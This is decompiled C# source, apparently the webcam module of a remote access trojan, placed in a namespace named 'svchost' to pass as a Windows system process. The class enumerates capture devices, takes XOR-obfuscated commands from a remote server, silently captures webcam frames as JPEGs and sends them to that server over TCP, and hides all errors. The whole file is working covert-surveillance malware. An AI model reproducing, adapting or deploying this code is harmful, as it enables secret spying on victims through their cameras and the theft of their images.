using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class WebcamViewer
{
	private const short WM_CAP = 1024;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_SET_PREVIEW = 1074;

	private const int WM_CAP_SET_PREVIEWRATE = 1076;

	private const int WM_CAP_SET_SCALE = 1077;

	private const int WS_CHILD = 1073741824;

	private const int WS_VISIBLE = 268435456;

	private const short HWND_BOTTOM = 1;

	private const short SWP_NOMOVE = 2;

	private const short SWP_NOSIZE = 1;

	private const short SWP_NOZORDER = 4;

	private string strName;

	private string strVer;

	private bool bReturn;

	private string lstDevices;

	private int hHwnd;

	private int x;

	private TcpClient WebCamClient;

	private NetworkStream WebCamStream;

	private byte[] SendBytes;

	private bool WebCamError;

	public WebcamViewer()
	{
		strName = Strings.Space(100);
		strVer = Strings.Space(100);
		x = 0;
		WebCamClient = new TcpClient();
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool DestroyWindow(int hndw);

	public void Go()
	{
		Thread.Sleep(1000);
		Application.DoEvents();
		x = 0;
		try
		{
			DateTime t = DateAndTime.get_Now().AddMilliseconds(1000.0);
			do
			{
				Application.DoEvents();
				Thread.Sleep(10);
			}
			while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
			WebCamClient.Connect(Form1.ServerIP, 32516);
			WebCamClient.NoDelay = true;
			WebCamStream = WebCamClient.GetStream();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		checked
		{
			try
			{
				do
				{
					bReturn = capGetDriverDescriptionA((short)x, ref strName, 100, ref strVer, 100);
					if (bReturn)
					{
						SendMessage(strName.Trim() + ",");
					}
					x++;
				}
				while (bReturn);
				SendMessage(".End");
				while (true)
				{
					string text = RxMessage();
					if (text.StartsWith("GetCap") | text.StartsWith("GetSnap"))
					{
						text.Trim();
						OpenPreviewWindow(text);
					}
					Thread.Sleep(10);
					Application.DoEvents();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					SendMessage("Error getting devices.End");
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void OpenPreviewWindow(string iDevice)
	{
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		checked
		{
			try
			{
				bool flag = default(bool);
				if (Strings.InStr(iDevice, "GetCap", (CompareMethod)0) != 0)
				{
					flag = true;
				}
				iDevice = iDevice.Substring(Strings.InStr(iDevice, ",", (CompareMethod)0));
				hHwnd = capCreateCaptureWindowA(ref iDevice, 0, 0, 0, 320, 240, hHwnd, 0);
				if (SendMessageA(hHwnd, 1034, IntegerType.FromString(iDevice), 0) != 0)
				{
					try
					{
						while (true)
						{
							SendMessageA(hHwnd, 1084, 0, 0);
							SendMessageA(hHwnd, 1054, 0, 0);
							IDataObject dataObject = Clipboard.GetDataObject();
							if (dataObject.GetDataPresent(typeof(Bitmap)))
							{
								Image val = (Image)dataObject.GetData(typeof(Bitmap));
								MemoryStream memoryStream = new MemoryStream();
								val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
								memoryStream.Seek(0L, SeekOrigin.Begin);
								memoryStream.Read(array, 0, (int)memoryStream.Length);
								if (WebCamStream.DataAvailable && Strings.InStr(RxMessage(), "Stop", (CompareMethod)0) != 0)
								{
									SendMessageA(hHwnd, 1035, IntegerType.FromString(iDevice), 0);
									return;
								}
								Thread.Sleep(500);
								Application.DoEvents();
								TcpClient tcpClient = new TcpClient();
								tcpClient.NoDelay = true;
								tcpClient.Connect(Form1.ServerIP, 32517);
								NetworkStream stream = tcpClient.GetStream();
								stream.Write(array, 0, array.Length);
								stream.Close();
								memoryStream.Close();
							}
							if (!flag)
							{
								break;
							}
							Thread.Sleep(10);
							Application.DoEvents();
						}
						SendMessageA(hHwnd, 1035, IntegerType.FromString(iDevice), 0);
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						SendMessageA(hHwnd, 1035, IntegerType.FromString(iDevice), 0);
						DestroyWindow(hHwnd);
						ProjectData.ClearProjectError();
						return;
					}
				}
				DestroyWindow(hHwnd);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private string RxMessage()
	{
		checked
		{
			byte[] array = new byte[WebCamClient.ReceiveBufferSize + 1];
			_ = DateTime.Now;
			string text = default(string);
			try
			{
				string text2 = default(string);
				while (true)
				{
					if (WebCamStream.DataAvailable)
					{
						int num = WebCamStream.Read(array, 0, WebCamClient.ReceiveBufferSize);
						string @string = Encoding.Default.GetString(array);
						if (num > 0)
						{
							text += @string.Substring(0, num);
							int num2 = text.Length - 1;
							for (int i = 0; i <= num2; i++)
							{
								text2 += StringType.FromChar(Strings.Chr(Strings.Asc(text.Substring(i, 1)) ^ 0xFF));
							}
							text = text2;
							if (text.ToString().StartsWith("\u0001\u0002") && text.EndsWith("\u0003"))
							{
								text = text.Replace("\u0001\u0002", "");
								text = text.Replace("\u0003", "");
								return text;
							}
						}
					}
					if (Form1.Connected)
					{
						Application.DoEvents();
						Thread.Sleep(10);
						continue;
					}
					break;
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return text;
			}
		}
	}

	public void SendMessage(string Message)
	{
		checked
		{
			try
			{
				if (StringType.StrCmp(Message, "", false) != 0)
				{
					Message = "\u0001\u0002" + Message;
					Message += "\u0003";
					int num = Message.Length - 1;
					string text = default(string);
					for (int i = 0; i <= num; i++)
					{
						text += StringType.FromChar(Strings.Chr(Strings.Asc(Message.Substring(i, 1)) ^ 0xFF));
					}
					SendBytes = Encoding.Default.GetBytes(text);
					WebCamStream.Write(SendBytes, 0, SendBytes.Length);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
